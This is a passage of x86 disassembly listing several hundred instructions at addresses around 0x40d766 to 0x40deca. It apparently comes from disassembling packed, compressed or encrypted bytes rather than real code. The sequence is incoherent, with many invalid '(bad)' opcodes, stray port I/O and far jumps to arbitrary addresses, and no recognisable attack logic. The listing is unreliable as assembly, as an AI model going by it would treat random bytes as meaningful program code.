  40d766:	jne    0x40d706
  40d768:	add    eax,0xf7a8a67
  40d76d:	stos   BYTE PTR es:[edi],al
  40d76e:	pop    eax
  40d76f:	je     0x40d7bb
  40d771:	and    dl,BYTE PTR [edx-0x39b9c3b7]
  40d777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d778:	dec    ecx
  40d779:	xchg   BYTE PTR [ebp+0x5],al
  40d77c:	xchg   BYTE PTR ds:0xf8736cb6,cl
  40d782:	add    DWORD PTR [ebp+0x42a2a4a],edi
  40d788:	adc    al,0x52
  40d78a:	cmp    al,bl
  40d78c:	xor    dh,bl
  40d78e:	inc    edi
  40d78f:	inc    ebx
  40d790:	push   ecx
  40d791:	stos   DWORD PTR es:[edi],eax
  40d792:	inc    edx
  40d793:	add    BYTE PTR [ecx+eax*1],0x8
  40d797:	jmp    0x40d767
  40d799:	loope  0x40d819
  40d79b:	inc    ecx
  40d79c:	inc    edi
  40d79d:	push   ebp
  40d79e:	inc    ecx
  40d79f:	scas   al,BYTE PTR es:[edi]
  40d7a0:	int3   
  40d7a1:	outs   dx,BYTE PTR ds:[esi]
  40d7a2:	in     al,0xf7
  40d7a4:	or     al,0xa9
  40d7a6:	mov    dl,BYTE PTR [ebx]
  40d7a8:	xor    al,0x6d
  40d7aa:	inc    ecx
  40d7ab:	ret    0xd5cc
  40d7ae:	mov    DWORD PTR [edx+0x77],ebp
  40d7b1:	sub    esi,DWORD PTR [esi]
  40d7b3:	lods   al,BYTE PTR ds:[esi]
  40d7b4:	stos   BYTE PTR es:[edi],al
  40d7b5:	sbb    bh,BYTE PTR [edx]
  40d7b7:	ins    BYTE PTR es:[edi],dx
  40d7b8:	int    0x7e
  40d7ba:	push   0xfffffff0
  40d7bc:	(bad)  
  40d7bd:	mov    WORD PTR [eax+0x3c],fs
  40d7c0:	dec    edi
  40d7c1:	mov    dh,0x82
  40d7c3:	fdiv   DWORD PTR es:[edx+0x2e90a019]
  40d7ca:	(bad)  [eax-0x24]
  40d7cd:	xchg   esp,eax
  40d7ce:	cmp    esi,DWORD PTR [esi]
  40d7d0:	retf   0xb02c
  40d7d3:	int    0x46
  40d7d5:	mov    esi,0xc6dc47e9
  40d7da:	push   esp
  40d7db:	jb     0x40d7f2
  40d7dd:	adc    cl,BYTE PTR [ebp-0x53]
  40d7e0:	push   ds
  40d7e1:	sub    BYTE PTR fs:[ebp-0x717733b4],bl
  40d7e8:	cmp    al,BYTE PTR [edx+eax*2+0x2e5a0a87]
  40d7ef:	inc    esp
  40d7f0:	mov    bl,ch
  40d7f2:	xchg   BYTE PTR [edx],cl
  40d7f4:	xor    eax,0x749e0ad1
  40d7f9:	out    dx,al
  40d7fa:	sbb    al,0x86
  40d7fc:	adc    eax,0x51f6dad6
  40d801:	test   BYTE PTR [eax],0x17
  40d804:	adc    BYTE PTR ds:0x8e011c03,dl
  40d80a:	repz (bad) 
  40d80c:	mov    esi,0x150df3b0
  40d811:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d812:	jg     0x40d860
  40d814:	xchg   esp,eax
  40d815:	jo     0x40d843
  40d817:	inc    DWORD PTR [esi+0x4d78500]
  40d81d:	sbb    ecx,esp
  40d81f:	and    bh,dh
  40d821:	push   esp
  40d822:	sub    eax,0x96bc35e6
  40d827:	ins    DWORD PTR es:[edi],dx
  40d828:	sbb    cl,BYTE PTR [edx]
  40d82a:	sub    dh,BYTE PTR [eax-0x7e]
  40d82d:	cmp    al,0x14
  40d82f:	loopne 0x40d8a8
  40d831:	repz or bl,BYTE PTR [edx+ebp*2]
  40d835:	inc    ecx
  40d836:	test   DWORD PTR [esi-0x7e],ebx
  40d839:	xchg   edx,eax
  40d83a:	cmp    al,0xc8
  40d83c:	test   DWORD PTR [edx+0x1415701f],eax
  40d842:	adc    al,0xfc
  40d844:	mov    ch,0xd8
  40d846:	cwde   
  40d847:	push   ds
  40d848:	(bad)  
  40d849:	outs   dx,BYTE PTR ds:[esi]
  40d84a:	jbe    0x40d860
  40d84c:	push   esp
  40d84d:	or     DWORD PTR [esi],0x7c
  40d850:	xchg   esi,eax
  40d851:	aam    0x3c
  40d853:	icebp  
  40d854:	jne    0x40d88a
  40d856:	sub    DWORD PTR [eax+eiz*4+0x319a0424],ecx
  40d85d:	(bad)  
  40d85e:	mov    ds:0xcb940286,al
  40d863:	stos   BYTE PTR es:[edi],al
  40d864:	cmc    
  40d865:	mov    edi,cs
  40d867:	and    DWORD PTR [edx+0x59746655],ecx
  40d86d:	adc    esi,DWORD PTR [edx-0xff352f8]
  40d873:	cmp    al,0x50
  40d875:	lock add al,0xb4
  40d878:	retf   
  40d879:	inc    esi
  40d87a:	push   ebp
  40d87b:	mov    edx,0xaa3d2aea
  40d880:	aaa    
  40d881:	stos   DWORD PTR es:[edi],eax
  40d882:	fcomp  DWORD PTR [esi-0x56cb3693]
  40d888:	add    al,0x52
  40d88a:	cmp    eax,0xd8230074
  40d88f:	(bad)  
  40d890:	mov    esi,0x2c76d955
  40d895:	adc    BYTE PTR [eax],dh
  40d897:	xchg   esp,eax
  40d898:	out    dx,al
  40d899:	stos   DWORD PTR es:[edi],eax
  40d89a:	nop
  40d89b:	add    dl,ah
  40d89d:	mov    ah,dl
  40d89f:	pop    ecx
  40d8a0:	pop    eax
  40d8a1:	sbb    eax,0xdc8a860d
  40d8a6:	pop    esi
  40d8a7:	pop    edx
  40d8a8:	inc    esp
  40d8a9:	(bad)  
  40d8aa:	push   ebp
  40d8ab:	dec    eax
  40d8ac:	fisubr DWORD PTR [esi-0x84cba9e]
  40d8b2:	xor    al,0xe2
  40d8b4:	add    dl,BYTE PTR [edx-0x69]
  40d8b7:	(bad)  
  40d8b8:	mov    eax,0xd758cbcf
  40d8bd:	push   es
  40d8be:	shl    DWORD PTR [esi-0x74],0x4e
  40d8c2:	(bad)  
  40d8c3:	xor    dh,BYTE PTR [edx]
  40d8c5:	into   
  40d8c6:	xchg   ecx,eax
  40d8c7:	cli    
  40d8c8:	ins    BYTE PTR es:[edi],dx
  40d8c9:	sbb    eax,0x97da4cd6
  40d8ce:	(bad)  
  40d8cf:	jmp    0x8342:0x6d9734fb
  40d8d6:	imul   edx,DWORD PTR [ebx],0x3e6970e4
  40d8dc:	retf   0x4cf2
  40d8df:	popa   
  40d8e0:	or     ebp,DWORD PTR [edx-0x4aa545f4]
  40d8e6:	(bad)  
  40d8e7:	mov    dh,0x46
  40d8e9:	call   0x6352:0x5eba1a8a
  40d8f0:	adc    al,BYTE PTR [eax]
  40d8f2:	std    
  40d8f3:	mov    dh,0xc3
  40d8f5:	add    ch,BYTE PTR [ecx+0x3aaab8fe]
  40d8fb:	inc    esp
  40d8fc:	or     ebp,DWORD PTR [eax-0xf19b72d]
  40d902:	in     al,0x12
  40d904:	pop    edi
  40d905:	pop    ebp
  40d906:	int    0x5
  40d908:	sub    ebp,DWORD PTR [eax]
  40d90a:	xor    eax,0xca8417
  40d90f:	int3   
  40d910:	sbb    esi,esp
  40d912:	retf   
  40d913:	xor    edx,DWORD PTR ds:0x9a8d8a8d
  40d919:	fs ss pop eax
  40d91c:	cs adc eax,0xcd7f1d8e
  40d922:	lods   eax,DWORD PTR ds:[esi]
  40d923:	add    BYTE PTR [eax+0x121b0095],dl
  40d929:	(bad)
  40d92d:	repnz sub DWORD PTR [ecx-0x79],0x968a2c13
  40d935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d936:	xor    al,0xde
  40d938:	shr    BYTE PTR [edx+0x79846c0a],1
  40d93e:	jbe    0x40d900
  40d940:	mov    esi,0x2e22fed8
  40d945:	shl    BYTE PTR [edx],cl
  40d947:	pop    eax
  40d948:	pop    ss
  40d949:	fsub   QWORD PTR [ebx+0x2814d4c4]
  40d94f:	ss adc al,0x68
  40d952:	jl     0x40d92e
  40d954:	add    DWORD PTR [ebx-0x494239d2],ebx
  40d95a:	mov    al,ds:0x534c56c2
  40d95f:	dec    ebx
  40d960:	cli    
  40d961:	mov    BYTE PTR [ebx],ch
  40d963:	sbb    BYTE PTR [ebx],dl
  40d965:	sub    eax,0x270e864
  40d96a:	add    eax,0xd2e4ba36
  40d96f:	sbb    eax,0xa82859ab
  40d974:	pop    eax
  40d975:	js     0x40d93d
  40d977:	jae    0x40d99d
  40d979:	mov    ebp,0x3c3626d7
  40d97e:	loopne 0x40d953
  40d980:	enter  0xf1d2,0x68
  40d984:	inc    ecx
  40d985:	lods   eax,DWORD PTR ds:[esi]
  40d986:	push   0xeb2e154d
  40d98b:	mov    eax,0xfabc2e8f
  40d990:	scas   al,BYTE PTR es:[edi]
  40d991:	call   0x918ddeab
  40d996:	loop   0x40da0c
  40d998:	or     BYTE PTR [edi],dl
  40d99a:	int3   
  40d99b:	push   edx
  40d99c:	push   edx
  40d99d:	retf   
  40d99e:	add    bl,dh
  40d9a0:	push   edi
  40d9a1:	mov    ah,0x1e
  40d9a3:	push   0xffffffa1
  40d9a5:	cs jno 0x40d9a8
  40d9a8:	mov    ch,0x68
  40d9aa:	add    cl,cl
  40d9ac:	pusha  
  40d9ad:	retf   
  40d9ae:	loopne 0x40d9e6
  40d9b0:	jne    0x40d994
  40d9b2:	xor    esp,ecx
  40d9b4:	mov    dh,0x66
  40d9b6:	sbb    ebx,DWORD PTR [edx+0x33]
  40d9b9:	inc    esp
  40d9ba:	sbb    BYTE PTR [eax-0x3567fc60],0xb4
  40d9c1:	loop   0x40d96f
  40d9c3:	inc    ebp
  40d9c4:	push   edi
  40d9c5:	aad    0x82
  40d9c7:	adc    ebx,DWORD PTR [eax+0xef6e543]
  40d9cd:	sub    BYTE PTR [edx+0x58],0xa0
  40d9d1:	xor    eax,0x151202b5
  40d9d6:	inc    eax
  40d9d7:	rcr    DWORD PTR [esi+eax*1],0x1c
  40d9db:	(bad)  
  40d9dc:	js     0x40d9de
  40d9de:	ins    BYTE PTR es:[edi],dx
  40d9df:	lods   eax,DWORD PTR ds:[esi]
  40d9e0:	jle    0x40da41
  40d9e2:	dec    esp
  40d9e3:	mov    dl,0xc4
  40d9e5:	ror    DWORD PTR [edi-0x68b0de86],1
  40d9eb:	pop    edx
  40d9ec:	push   ecx
  40d9ed:	and    BYTE PTR [esp+edi*1+0x7e],dl
  40d9f1:	call   0xf7b5be5d
  40d9f6:	ficomp WORD PTR [edx+0x6b]
  40d9f9:	inc    ebp
  40d9fa:	es cmc 
  40d9fc:	xor    BYTE PTR [edi],0x22
  40d9ff:	sbb    esi,DWORD PTR [edx+0x2faa46a0]
  40da05:	add    BYTE PTR [eax+0x50],ch
  40da08:	fcom   st(4)
  40da0a:	rol    BYTE PTR [esi+esi*4],1
  40da0d:	sbb    bl,BYTE PTR [eax+eax*2-0x45]
  40da11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da12:	sub    ch,BYTE PTR [edx-0x52]
  40da15:	in     eax,dx
  40da16:	mov    esp,0x7d87826c
  40da1b:	xchg   edx,eax
  40da1c:	call   0x62198af1
  40da21:	jmp    0x40da4b
  40da23:	jmp    0x8e5a:0xe5088080
  40da2a:	pop    esi
  40da2b:	jns    0x40da39
  40da2d:	fcmovnbe st,st(1)
  40da2f:	popa   
  40da30:	fwait
  40da31:	enter  0x55be,0x1c
  40da35:	call   0x58311c40
  40da3a:	fimul  WORD PTR [eax+0x6c12ed8]
  40da40:	adc    al,0x2
  40da42:	stc    
  40da43:	in     al,0x20
  40da45:	out    dx,eax
  40da46:	stos   DWORD PTR es:[edi],eax
  40da47:	rcr    BYTE PTR [ebx-0x4d],1
  40da4a:	int    0x49
  40da4c:	sbb    al,0xe8
  40da4e:	outs   dx,DWORD PTR ds:[esi]
  40da4f:	cdq    
  40da50:	and    al,ah
  40da52:	in     eax,dx
  40da53:	or     bl,BYTE PTR [edi-0x34]
  40da56:	inc    ecx
  40da57:	pop    ebx
  40da58:	push   ecx
  40da59:	gs mov dl,0x2a
  40da5c:	mov    al,dl
  40da5e:	clc    
  40da5f:	call   0x66479a7a
  40da64:	fwait
  40da65:	stc    
  40da66:	sub    ah,BYTE PTR [eax-0xa]
  40da69:	rol    DWORD PTR [eax],cl
  40da6b:	pop    esp
  40da6c:	cmp    al,0x88
  40da6e:	out    dx,al
  40da6f:	pop    ebx
  40da70:	and    bh,BYTE PTR [ecx+eiz*2-0x4d]
  40da74:	dec    ebp
  40da75:	lea    edi,[ecx-0x20]
  40da78:	xchg   esp,eax
  40da79:	jmp    0x1ab2:0xa0ee9ad0
  40da80:	stos   BYTE PTR es:[edi],al
  40da81:	stos   BYTE PTR es:[edi],al
  40da82:	lods   al,BYTE PTR ds:[esi]
  40da83:	jp     0x40daa7
  40da85:	mov    eax,0x77320c4e
  40da8a:	outs   dx,BYTE PTR ds:[esi]
  40da8b:	push   esi
  40da8c:	sbb    bh,BYTE PTR [edx-0x4099f4fc]
  40da92:	inc    ebx
  40da93:	push   es
  40da94:	dec    edx
  40da95:	test   eax,0xbb007108
  40da9a:	sub    bh,BYTE PTR [edx]
  40da9c:	pushf  
  40da9d:	ds pop esi
  40da9f:	mov    ecx,0x4c2275fe
  40daa4:	xor    BYTE PTR [eax+0x46d2e07d],dh
  40daaa:	jecxz  0x40db0f
  40daac:	mov    WORD PTR [esi-0x27c7ebba],es
  40dab2:	mov    dl,BYTE PTR [ebx]
  40dab4:	adc    BYTE PTR [edx+ecx*2-0x1a],cl
  40dab8:	pop    ebp
  40dab9:	jno    0x36235392
  40dabf:	or     ch,bl
  40dac1:	add    BYTE PTR [edi+0x1505156b],dh
  40dac7:	dec    ebp
  40dac8:	push   0x15
  40daca:	inc    esi
  40dacb:	bound  ebx,QWORD PTR [esi]
  40dacd:	xchg   edi,eax
  40dace:	add    al,0x6
  40dad0:	add    eax,0xe41d0515
  40dad5:	mov    dh,0x6c
  40dad7:	in     eax,dx
  40dad8:	push   0x19
  40dada:	test   al,0xe
  40dadc:	fdivr  DWORD PTR [edx]
  40dade:	ins    BYTE PTR es:[edi],dx
  40dadf:	cmp    BYTE PTR [ecx-0x66d0e9ca],0xc9
  40dae6:	or     DWORD PTR [eax-0xa],esi
  40dae9:	out    0xa2,eax
  40daeb:	shr    BYTE PTR [ecx],0x2b
  40daee:	pop    edx
  40daef:	call   0xa1a1:0xf1c0f446
  40daf6:	mov    ds:0xb0251ca1,eax
  40dafb:	aas    
  40dafc:	cld    
  40dafd:	ins    BYTE PTR es:[edi],dx
  40dafe:	mov    WORD PTR [esi-0x49e2fa80],cs
  40db04:	and    ch,bh
  40db06:	out    0x34,al
  40db08:	int3   
  40db09:	retf   0x6e36
  40db0c:	ins    BYTE PTR es:[edi],dx
  40db0d:	or     eax,0xee1e2a8b
  40db12:	jne    0x40db5a
  40db14:	add    eax,0x2601218c
  40db19:	push   ebx
  40db1a:	sub    DWORD PTR [ebp-0x3e],edx
  40db1d:	cld    
  40db1e:	add    BYTE PTR [ecx],ch
  40db20:	mov    esp,0x84fb5600
  40db25:	pop    esp
  40db26:	add    ah,ch
  40db28:	adc    BYTE PTR [ecx],cl
  40db2a:	out    0xaa,al
  40db2c:	mov    al,BYTE PTR [ecx+0x50]
  40db2f:	inc    ecx
  40db30:	xchg   edx,esp
  40db32:	add    DWORD PTR [esi+0x20],esi
  40db35:	outs   dx,BYTE PTR ds:[esi]
  40db36:	mov    dl,0xea
  40db38:	cmp    al,0x66
  40db3a:	push   ebp
  40db3b:	popa   
  40db3c:	fwait
  40db3d:	imul   ecx,DWORD PTR [ecx+edx*1-0x1a2b83ba],0x89b2b858
  40db48:	or     cl,al
  40db4a:	push   esi
  40db4b:	pushf  
  40db4c:	xchg   esi,eax
  40db4d:	mov    BYTE PTR [ebx+0x10],bh
  40db50:	test   al,0xe0
  40db52:	mov    al,0xab
  40db54:	test   al,0xa9
  40db56:	sub    BYTE PTR [edx-0x3c],al
  40db59:	pop    esi
  40db5a:	xchg   edx,eax
  40db5b:	inc    esp
  40db5c:	or     BYTE PTR [esi-0x1d],0x69
  40db60:	sub    edx,0xffffffa7
  40db63:	push   esi
  40db64:	lds    ebp,FWORD PTR [ecx]
  40db66:	scas   al,BYTE PTR es:[edi]
  40db67:	pop    esp
  40db68:	fisubr WORD PTR [esi]
  40db6a:	xchg   ecx,eax
  40db6b:	push   0x24f4877b
  40db70:	(bad)  
  40db71:	lods   al,BYTE PTR ds:[esi]
  40db72:	add    BYTE PTR [ecx],bh
  40db74:	les    ecx,FWORD PTR [ecx-0x13]
  40db77:	into   
  40db78:	mov    dh,0xd1
  40db7a:	popa   
  40db7b:	or     ebp,DWORD PTR [edi+edx*8-0x80]
  40db7f:	pop    esi
  40db80:	pushf  
  40db81:	mov    eax,0xa806343c
  40db86:	add    BYTE PTR [edx],0xdb
  40db89:	aam    0x96
  40db8b:	shl    DWORD PTR [edx-0x33655cb0],1
  40db91:	jg     0x40dba5
  40db93:	xor    eax,0xc05146b5
  40db98:	mov    edx,0xed58e9b2
  40db9d:	mov    ebp,0x6435a1a0
  40dba2:	pop    ecx
  40dba3:	dec    esp
  40dba4:	ss push cs
  40dba6:	jo     0x40db32
  40dba8:	arpl   WORD PTR ds:0x6a28a600,bx
  40dbae:	mov    dh,0xaa
  40dbb0:	mov    eax,0xcdfc0c3c
  40dbb5:	jl     0x40db69
  40dbb7:	sub    BYTE PTR [esi-0x6faf9249],al
  40dbbd:	sub    BYTE PTR [esi+0x71],cl
  40dbc0:	jbe    0x40db66
  40dbc2:	bnd ret 0x2a0b
  40dbc6:	sub    bl,BYTE PTR [edx-0x475059de]
  40dbcc:	xchg   ebx,eax
  40dbcd:	xor    al,0xb3
  40dbcf:	mov    ah,BYTE PTR [ebp+0x66]
  40dbd2:	pop    edx
  40dbd3:	push   esp
  40dbd4:	push   esp
  40dbd5:	fs jl  0x40db82
  40dbd8:	cs mov esp,0xb0fb98c1
  40dbde:	inc    ebp
  40dbdf:	sub    DWORD PTR [ebp-0x29],0x70
  40dbe3:	int    0xc4
  40dbe5:	les    ebx,FWORD PTR [edx+eiz*8]
  40dbe8:	xchg   edx,eax
  40dbe9:	adc    eax,0x6150c916
  40dbee:	ins    DWORD PTR es:[edi],dx
  40dbef:	call   0x99a6:0x9410d0ff
  40dbf6:	mov    dh,0x30
  40dbf8:	(bad)  
  40dbfa:	dec    ebp
  40dbfb:	stos   BYTE PTR es:[edi],al
  40dbfc:	fwait
  40dbfd:	jbe    0x40dc38
  40dbff:	push   eax
  40dc00:	add    dl,dl
  40dc02:	sbb    DWORD PTR [edx-0x2c],ecx
  40dc05:	push   0x2b
  40dc07:	mov    ds:0x9deb88c2,al
  40dc0c:	mov    ecx,esi
  40dc0e:	cmp    al,dl
  40dc10:	mov    cl,0x55
  40dc12:	cdq    
  40dc13:	xchg   BYTE PTR [esi+0xc],al
  40dc16:	shl    BYTE PTR [ebx+esi*1-0x2f],0x8a
  40dc1b:	mov    edx,0xd60de6c6
  40dc20:	(bad)  
  40dc22:	mov    dl,0xaa
  40dc24:	ss scas al,BYTE PTR es:[edi]
  40dc26:	add    BYTE PTR [ecx+0x45058be7],al
  40dc2c:	or     eax,0x92b6da07
  40dc31:	sub    al,0x2c
  40dc33:	lods   eax,DWORD PTR ds:[esi]
  40dc34:	sub    cl,BYTE PTR [ecx]
  40dc36:	stos   BYTE PTR es:[edi],al
  40dc37:	sub    bl,BYTE PTR [edx+0x1f94144b]
  40dc3d:	or     ch,cl
  40dc3f:	pop    edx
  40dc40:	aad    0x24
  40dc42:	xlat   BYTE PTR ds:[ebx]
  40dc43:	add    dh,BYTE PTR [ebx]
  40dc45:	shl    BYTE PTR [esi-0x76],cl
  40dc48:	loope  0x40dc48
  40dc4a:	xor    ebp,DWORD PTR ds:0xe876cdb2
  40dc50:	mov    esp,?
  40dc52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc53:	sahf   
  40dc54:	xor    eax,0x3b94dc23
  40dc59:	ins    BYTE PTR es:[edi],dx
  40dc5a:	inc    ecx
  40dc5b:	inc    ecx
  40dc5c:	psrld  mm7,QWORD PTR [ecx+0x44ba2f6]
  40dc63:	not    al
  40dc65:	jmp    0x517932a
  40dc6a:	mov    ah,0xc4
  40dc6c:	adc    DWORD PTR [eax+esi*4+0x46],edi
  40dc70:	out    0x31,al
  40dc72:	push   edx
  40dc73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc74:	scas   al,BYTE PTR es:[edi]
  40dc75:	dec    ebp
  40dc76:	bound  edi,QWORD PTR [esi]
  40dc78:	push   0x18
  40dc7a:	adc    al,0x4a
  40dc7c:	test   al,0x28
  40dc7e:	xchg   DWORD PTR [ebp-0x12a5dab],esi
  40dc84:	mov    ds:0x1bd06504,al
  40dc89:	add    al,0x3c
  40dc8b:	inc    ecx
  40dc8c:	inc    edi
  40dc8d:	inc    ebx
  40dc8e:	push   ebp
  40dc8f:	pushf  
  40dc90:	and    al,0x62
  40dc92:	jp     0x40dc5a
  40dc94:	ss push ebx
  40dc96:	shl    BYTE PTR ss:[edx-0x37e8932a],0x5e
  40dc9e:	mov    dl,0x48
  40dca0:	cmp    cl,BYTE PTR [esi-0x15b2bb98]
  40dca6:	fsub   DWORD PTR [ecx]
  40dca8:	sub    BYTE PTR [eax+0x16],dh
  40dcab:	lock pusha 
  40dcad:	dec    ebx
  40dcae:	sub    cl,ah
  40dcb0:	(bad)  
  40dcb1:	aaa    
  40dcb2:	das    
  40dcb3:	fisub  DWORD PTR [ecx]
  40dcb5:	loopne 0x40dcb7
  40dcb7:	into   
  40dcb8:	sbb    eax,0xd90013fe
  40dcbd:	mov    cl,0xf4
  40dcbf:	add    BYTE PTR [ecx+0x37],bh
  40dcc2:	int    0xcd
  40dcc4:	fwait
  40dcc5:	jmp    0x40dcc9
  40dcc7:	add    BYTE PTR [esi],bh
  40dcc9:	inc    ebx
  40dcca:	jmp    0x779789cf
  40dccf:	repz add BYTE PTR [edx-0x2d6432a3],ah
  40dcd6:	loopne 0x40dd2d
  40dcd8:	add    BYTE PTR [ebx-0x5aa097e5],cl
  40dcde:	or     BYTE PTR [esp+esi*4],dh
  40dce1:	in     eax,dx
  40dce2:	xchg   BYTE PTR [edi+0x3a007c92],bh
  40dce8:	retf   0xcf68
  40dceb:	sub    BYTE PTR ds:0xd68ecb3e,ah
  40dcf1:	xor    BYTE PTR [edx-0x66],dl
  40dcf4:	cmp    BYTE PTR ds:[esi-0x594bc5c0],bl
  40dcfb:	test   al,0xa0
  40dcfd:	(bad)  [edi-0x4c]
  40dd00:	push   ss
  40dd01:	sbb    al,0x24
  40dd03:	ins    BYTE PTR es:[edi],dx
  40dd04:	call   0xb6f5e007
  40dd09:	jns    0x40dcfe
  40dd0b:	enter  0x5d,0x86
  40dd0f:	mov    esp,0x11c0006
  40dd14:	and    BYTE PTR [edx+esi*2],al
  40dd17:	mov    eax,0x4569d8d2
  40dd1c:	xchg   ecx,eax
  40dd1d:	cs inc esp
  40dd1f:	in     eax,dx
  40dd20:	pop    eax
  40dd21:	push   cs
  40dd22:	imul   esi,DWORD PTR [ebx-0x524f6109],0xce974bcb
  40dd2c:	and    DWORD PTR [edx],ecx
  40dd2e:	adc    eax,0x5a2a76d3
  40dd33:	test   DWORD PTR ds:0x4cc9cdd8,ebp
  40dd39:	xor    BYTE PTR [ebp-0x2a],0x9b
  40dd3d:	push   ss
  40dd3e:	(bad)  
  40dd40:	aam    0x9a
  40dd42:	cmp    bh,BYTE PTR [esi-0x48]
  40dd45:	push   ss
  40dd46:	mov    ch,0x1c
  40dd48:	push   cs
  40dd49:	mov    esi,0x51d8efb3
  40dd4e:	shr    BYTE PTR [eax*1-0x1ee1a6ac],1
  40dd55:	int3   
  40dd56:	lock xchg edx,eax
  40dd58:	add    BYTE PTR [esp+esi*2-0x65d43ca],dh
  40dd5f:	add    BYTE PTR [edi+0x43],bl
  40dd62:	add    al,bh
  40dd64:	js     0x40dd9a
  40dd66:	push   ecx
  40dd67:	lock add BYTE PTR [edx],ch
  40dd6a:	clc    
  40dd6b:	les    esi,FWORD PTR [ecx]
  40dd6d:	sbb    BYTE PTR ds:0x678ed686,0xd6
  40dd74:	test   eax,edi
  40dd76:	fsubr  st,st(6)
  40dd78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd79:	pushf  
  40dd7a:	xchg   BYTE PTR ds:0xf7e1d55,dl
  40dd80:	mov    ds:0x87299a64,al
  40dd85:	repnz pop esp
  40dd87:	ins    DWORD PTR es:[edi],dx
  40dd88:	push   ebx
  40dd89:	or     edi,DWORD PTR [esi]
  40dd8b:	dec    esp
  40dd8c:	cld    
  40dd8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd8e:	xor    al,0x7f
  40dd90:	push   eax
  40dd91:	fcmovbe st,st(0)
  40dd93:	aad    0x8a
  40dd95:	stos   BYTE PTR es:[edi],al
  40dd96:	shl    esp,1
  40dd98:	push   0xffffff9e
  40dd9a:	test   DWORD PTR [esi-0x23],edx
  40dd9d:	dec    ecx
  40dd9e:	xchg   BYTE PTR [edx+0xfbe4f45],al
  40dda4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dda5:	(bad)  
  40dda6:	std    
  40dda7:	(bad)  
  40dda8:	into   
  40dda9:	xor    ah,BYTE PTR [edx-0x5467a9d3]
  40ddaf:	pop    esi
  40ddb0:	cwde   
  40ddb1:	pop    ds
  40ddb2:	xlat   BYTE PTR ds:[ebx]
  40ddb3:	inc    ecx
  40ddb4:	inc    ebp
  40ddb5:	in     al,dx
  40ddb6:	push   eax
  40ddb7:	push   esp
  40ddb8:	fs (bad) 
  40ddba:	xor    eax,DWORD PTR [eax]
  40ddbc:	sbb    ah,0x0
  40ddbf:	stos   DWORD PTR es:[edi],eax
  40ddc0:	call   0x1a497769
  40ddc5:	nop
  40ddc6:	ss cmp ch,dl
  40ddc9:	push   esi
  40ddca:	add    ecx,edx
  40ddcc:	es jne 0x40de05
  40ddcf:	mov    al,0xd
  40ddd1:	int    0xc4
  40ddd3:	stos   BYTE PTR es:[edi],al
  40ddd4:	dec    esp
  40ddd5:	sbb    BYTE PTR [esi+ebx*4],0xf7
  40ddd9:	adc    esp,DWORD PTR [eax+ebp*4-0x77]
  40dddd:	dec    eax
  40ddde:	ins    BYTE PTR es:[edi],dx
  40dddf:	mov    al,0xa0
  40dde1:	mov    ds:0x36e5be0c,al
  40dde6:	je     0x40ddfc
  40dde8:	sbb    al,0x42
  40ddea:	into   
  40ddeb:	push   es
  40ddec:	cmc    
  40dded:	mov    ah,0x1f
  40ddef:	or     bl,dh
  40ddf1:	jmp    0x24082150
  40ddf6:	jl     0x40de6d
  40ddf8:	or     al,0x6
  40ddfa:	jp     0x40de60
  40ddfc:	rcl    BYTE PTR [eax+ecx*4+0x15],1
  40de00:	push   edi
  40de01:	fisubr DWORD PTR [edx+ebp*4+0x16282a58]
  40de08:	mov    dh,0xc5
  40de0a:	adc    al,0xb6
  40de0c:	push   esi
  40de0d:	hlt    
  40de0e:	mov    eax,0xee5d8cb2
  40de13:	sbb    al,0x28
  40de15:	jp     0x40ddf3
  40de17:	cmp    ebp,DWORD PTR fs:[ebx+edi*8-0x74]
  40de1c:	sub    BYTE PTR [edx],cl
  40de1e:	push   cs
  40de1f:	pop    ebp
  40de20:	call   0x82c4b2d3
  40de25:	add    BYTE PTR [edx-0x564d27fc],bh
  40de2b:	and    DWORD PTR [edx-0x5e5dae50],eax
  40de31:	(bad)  
  40de32:	in     al,0xb6
  40de34:	sbb    bl,BYTE PTR [eax+0x39]
  40de37:	mov    dh,0xd6
  40de39:	cwde   
  40de3a:	or     eax,0xe41a2e05
  40de3f:	xor    DWORD PTR [edx],0x21
  40de42:	cmp    BYTE PTR [ecx],cl
  40de44:	mov    ch,BYTE PTR [edx]
  40de46:	push   esi
  40de47:	mov    esi,0x51a0e086
  40de4c:	je     0x40debd
  40de4e:	dec    eax
  40de4f:	adc    DWORD PTR [esi+0x6da6a3a8],esi
  40de55:	push   es
  40de56:	dec    ebx
  40de57:	stos   BYTE PTR es:[edi],al
  40de58:	inc    ebx
  40de59:	cmp    eax,0x95542646
  40de5e:	test   dl,cl
  40de60:	es xor esi,0xe0d8cf45
  40de67:	test   BYTE PTR [esi-0x1c9fc869],bl
  40de6d:	or     cl,BYTE PTR es:[ebp-0x4b]
  40de71:	sub    DWORD PTR [edx+0x28],ebp
  40de74:	in     eax,0x4a
  40de76:	aad    0xaa
  40de78:	sbb    dh,al
  40de7a:	mov    esi,0x820d85b6
  40de7f:	adc    eax,0x6090e740
  40de84:	push   0xd68211f2
  40de89:	sbb    bl,BYTE PTR [esi-0x3843287c]
  40de8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de90:	push   esp
  40de91:	mov    gs,WORD PTR [ebp+0x361835a2]
  40de97:	fcomp  st(2)
  40de99:	inc    edx
  40de9a:	cmp    ah,dh
  40de9c:	mov    bh,0x95
  40de9e:	outs   dx,BYTE PTR ds:[esi]
  40de9f:	bound  ecx,QWORD PTR ds:0x36cda286
  40dea5:	sbb    BYTE PTR [eax-0x2f],0xca
  40dea9:	mov    dl,0xab
  40deab:	aam    0x14
  40dead:	sub    BYTE PTR [esi+0x15051142],dh
  40deb3:	inc    esi
  40deb4:	push   edi
  40deb5:	or     al,0x35
  40deb7:	ret    0x30e8
  40deba:	ins    BYTE PTR es:[edi],dx
  40debb:	push   ebp
  40debc:	shr    BYTE PTR [ecx+0x1c],0x52
  40dec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dec1:	enter  0xfbf0,0x2d
  40dec5:	push   0x12
  40dec7:	lods   al,BYTE PTR ds:[esi]
  40dec8:	sbb    al,0x7d
  40deca:	lea    esp,[esi+esi*2]
